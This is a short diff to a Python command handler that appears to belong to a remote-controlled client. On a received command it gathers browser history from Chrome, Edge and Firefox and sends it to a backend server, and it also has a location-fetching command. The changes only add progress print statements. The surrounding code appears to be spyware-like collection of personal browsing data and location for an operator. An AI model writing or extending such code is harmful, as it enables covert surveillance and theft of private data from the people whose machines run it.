@@ -881,13 +881,16 @@ def execute_command(cmd):
             try:
                 print("🌐 Fetching browser history (Chrome, Edge, Firefox)...")
                 history_list = get_all_browser_history()
+                print(f"✅ Found {len(history_list)} history entries")
                 
                 # Send to backend (NEW)
                 send_browser_history_to_backend(history_list)
                 
                 # Also send as result (for backward compatibility)
                 send_result(command_id, {"type": "chromehistory", "data": history_list})
+                print("✅ Browser history result sent to backend")
             except Exception as e:
+                print(f"❌ Browser history failed: {e}")
                 send_result(command_id, {"type": "chromehistory", "success": False, "message": str(e)})
         
         elif command_type == "get_location":
